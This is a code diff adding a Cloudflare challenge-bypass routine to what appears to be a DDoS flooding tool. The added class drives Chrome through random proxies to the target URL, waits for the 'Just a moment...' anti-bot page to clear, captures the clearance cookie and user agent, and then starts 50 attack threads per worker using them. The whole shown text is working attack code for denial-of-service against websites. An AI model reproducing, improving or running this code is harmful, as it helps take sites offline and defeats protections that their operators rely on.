@@ -70,7 +70,79 @@ ONE_BROWSER_QUERYS_LIMIT = 1500
 ANTI_DDOS_SLEEP_SECS = 600
 
 ######################################## BLAZNING FAST BYPASSER
+class Target():
+    def Bypass( hash_digest ):
+        global config
 
+        proxy = random.choice(config['proxies'])
+        options = webdriver.ChromeOptions()
+        options.add_argument("--disable-infobars")
+        options.add_argument("--disable-logging")
+        options.add_argument('--no-sandbox')
+        options.add_argument('--proxy-server=%s' % proxy)
+        options.add_argument("--disable-login-animations")
+        options.add_argument("--disable-notifications")
+        options.add_argument("--disable-default-apps")
+        options.add_argument("--disable-popup-blocking")
+        driver = webdriver.Chrome(options=options)
+
+        print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
+            stylize(f" New worker started", colored.fg('green')))
+
+        driver.get('https://google.com/')
+        driver.execute_script(f"window.open('{Main.GetArgs()[1]}')")
+        driver.switch_to.window(driver.window_handles[1])
+
+        # WAITING BYPASS UAM
+        BypassEvent = True
+        while BypassEvent:
+            time.sleep(6)
+
+            if driver.title != 'Just a moment...':
+                BypassEvent = False
+
+                print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
+                    stylize(f" Challenge bypassed successfully.", colored.fg('green')))
+
+                config['threads'][hash_digest] = True
+
+                cookieJar = driver.get_cookies()[0] if len(driver.get_cookies()) != 0 else False
+                useragent = driver.execute_script("return navigator.userAgent")
+
+                driver.quit()
+
+                # WAITING ALL THREADS COMPLETE
+                ThreadEvent = True
+                while ThreadEvent:
+                    time.sleep(1)
+
+                    if all(value == True for value in config['threads'].values()):
+                        ThreadEvent = False
+
+                        proxy = {
+                            'https': f'http://{proxy}'
+                        }
+
+                        if cookieJar != False:
+                            cookie = f"{cookieJar['name']}={cookieJar['value']}"
+                        else:
+                            cookie = False
+                            pass
+
+                        print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
+                            stylize(f" Starting workers ...", colored.fg('green')))
+                        for _ in range(50):
+                            threading.Thread(target=Target.Start, args=[cookie, useragent, proxy]).start()
+                            pass
+                        pass
+                    pass
+                else:
+                    driver.execute_script(f"window.open('{Main.GetArgs()[1]}')")
+                    driver.switch_to.window(driver.window_handles[1])
+                    pass
+                pass
+            pass
+        pass
 ########################################### 
   
 ##################D1MOD FILE 
